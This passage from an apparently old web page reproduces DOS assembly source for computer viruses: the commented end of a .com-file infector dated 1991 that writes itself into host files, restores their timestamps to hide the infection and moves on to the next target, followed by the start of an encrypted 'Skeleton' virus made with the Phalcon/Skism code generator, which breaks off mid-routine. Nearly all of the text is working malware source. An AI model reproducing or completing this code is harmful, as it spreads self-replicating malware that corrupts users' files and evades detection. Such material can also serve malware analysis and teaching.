<p><font color="#FF0000">&nbsp;&nbsp; mov ah,3ch&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Create file with handle</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; cx=attribs -- set no attributes</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov dx,ds:[0feh]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; point to name</font>
<br><font color="#FF0000">&nbsp;&nbsp; clc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; clear carry flag</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; create file</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Note: If filename already exists, (which it does)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; truncate the filelength to zero - this is ok as</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; we have already copied the file to be infected</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; into memory.</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov bx,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; mov file handle into bx</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,40h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; write file with handle (write to the file to be</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; infected) - length currently zero</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; cx=number of bytes to write</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,ds:[0fch]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; length of file to be infected</font>
<br><font color="#FF0000">&nbsp;&nbsp; add cx,ds:[0fah]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; length of virus</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov DX,ds:[0f8h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; location of write buffer (this contains the virus</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; + the file to be infected)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; write file</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; new file = virus + file to be infected</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,5701h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; restore original time &amp; date values</font>
<br><font color="#FF0000">&nbsp;&nbsp; pop dx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get old date from the stack</font>
<br><font color="#FF0000">&nbsp;&nbsp; pop cx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; get old time from the stack</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Note: Infected file will now carry the time &amp; date</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; it had before the infection.</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ah,3eh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; close file (bx=file handle)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Note: date &amp; time stamps automatically updated if</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; file written to.</font>
<p><font color="#FF0000">fin:</font>
<br><font color="#FF0000">&nbsp;&nbsp; stc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; set carry flags</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ah,4fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; find next file (.com)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<br><font color="#FF0000">&nbsp;&nbsp; or ax,ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; decides zero flag outcome</font>
<br><font color="#FF0000">&nbsp;&nbsp; jnz done&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; if no more .com files, jmp done</font>
<br><font color="#FF0000">&nbsp;&nbsp; JMP file_found&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; else begin re-infection process for new file.</font>
<p><font color="#FF0000">done:</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,80h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; set counter (cx) = 80h</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov si,0ff7fh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; source offset address (copy from here)</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov di,0080h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; destination offset address (copy to here)</font>
<br><font color="#FF0000">&nbsp;&nbsp; rep movsb&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; copy bytes! (cx is auto decremented by 1</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; si &amp; di are auto incremented by 1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Note: this is a 'restore parameters' feature</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; this does the reverse of what what done earlier</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; in the program (do_not_activate:)</font>
<p><font color="#FF0000">&nbsp;&nbsp; mov ax,0a4f3h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fff9h],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov al,0eah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fffbh],al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; reset data segment locations ??? (to previous</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ax,100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; values before virus infection)</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fffch],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;</font>
<br><font color="#FF0000">&nbsp;&nbsp; lea si,begp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; load exit from program offset address into si</font>
<br><font color="#FF0000">&nbsp;&nbsp; lea di,start&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; load offset address of start of virus into di</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ax,cs</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov ds:[0fffeh],ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; re-align cs = ds ???</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov kk,ax</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov cx,fso</font>
<p><font color="#FF0000">&nbsp;&nbsp; db 0eah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; define byte</font>
<br><font color="#FF0000">&nbsp;&nbsp; dw 0fff9h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; define word</font>
<br><font color="#FF0000">&nbsp;&nbsp; kk dw 0000h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; define kk = word</font>
<p><font color="#FF0000">&nbsp;&nbsp; mess db 'Sad virus - 24/8/91',13,10,'$'&nbsp;&nbsp;&nbsp;
; virus message to display</font>
<p><font color="#FF0000">&nbsp;&nbsp; file_type_to_infect db '*?.com',0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; infect only .com files.</font>
<p><font color="#FF0000">&nbsp;&nbsp; fso dw 0005h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; store 5 into 'fso'. dw means that fso is 2 bytes</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
;&nbsp;&nbsp; in size (a word)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; ----- alma mater</font>
<br>&nbsp;
<p><font color="#FF0000">begp:</font>
<br><font color="#FF0000">&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; ax,4c00h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; normal dos termination (set al to 00)</font>
<br><font color="#FF0000">&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp; 21h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; do it</font>
<p><font color="#FF0000">end start</font>
<p><u>Skeleton virus:</u>
<p><font color="#3333FF">; target.asm : [Skeleton] by Deke</font>
<br><font color="#3333FF">; Created wik the Phalcon/Skism Mass-Produced
Code Generator</font>
<br><font color="#3333FF">; from the configuration file skeleton.cfg</font>
<p><font color="#3333FF">.model tiny&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Handy directive</font>
<br><font color="#3333FF">.code&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Virus code segment</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
org&nbsp;&nbsp;&nbsp; 100h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; COM file starting IP</font>
<p><font color="#3333FF">id = 'DA'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; ID word for EXE infections</font>
<br><font color="#3333FF">entry_point: db 0e9h,0,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; jmp decrypt</font>
<p><font color="#3333FF">startvirus:</font>
<br><font color="#3333FF">decrypt:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; handles encryption and decryption</font>
<br><font color="#3333FF">patch_startencrypt:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; bp,offset startencrypt&nbsp;&nbsp; ; start of decryption</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ax,(offset heap - offset startencrypt)/2 ; iterations</font>
<br><font color="#3333FF">decrypt_loop:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
db&nbsp;&nbsp; 2eh,81h,76h,0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; xor word ptr cs:[bp], xxxx</font>
<br><font color="#3333FF">decrypt_value dw&nbsp; 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; initialised at zero for null effect</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc&nbsp; bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; calculate new decryption location</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc&nbsp; bp</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
dec&nbsp; ax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; If we are not done, then</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jnz&nbsp; decrypt_loop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; decrypt mo'</font>
<br><font color="#3333FF">startencrypt:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call next&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; calculate delta offset</font>
<br><font color="#3333FF">next:&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp; bp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; bp = IP next</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
sub&nbsp; bp,offset next&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; bp = delta offset</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
cmp&nbsp; sp,id&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; COM or EXE?</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
je&nbsp;&nbsp; restoreEXE</font>
<br><font color="#3333FF">restoreCOM:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; si,[bp+offset save3]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; di,100h</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push di&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; For later return</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsb</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
jmp&nbsp; short restoreEXIT</font>
<br><font color="#3333FF">restoreEXE:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; DS = CS</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; ds</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push cs&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; ES = CS</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop&nbsp; es</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; si,[bp+offset oldCSIP2]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; di,[bp+offset oldCSIP]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsw</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsw</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsw</font>
<br><font color="#3333FF">restoreEXIT:</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
movsw</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; byte ptr [bp+numinfec],3 ; reset infection counter</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov&nbsp; ah,1Ah&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
; Set new DTA</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset newDTA]&nbsp;&nbsp;&nbsp; ; new DTA @ DS:DX</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp; 21h</font>
<p><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset exe_mask]</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
call infect_mask</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
lea&nbsp; dx,[bp+offset com_mask]</font>
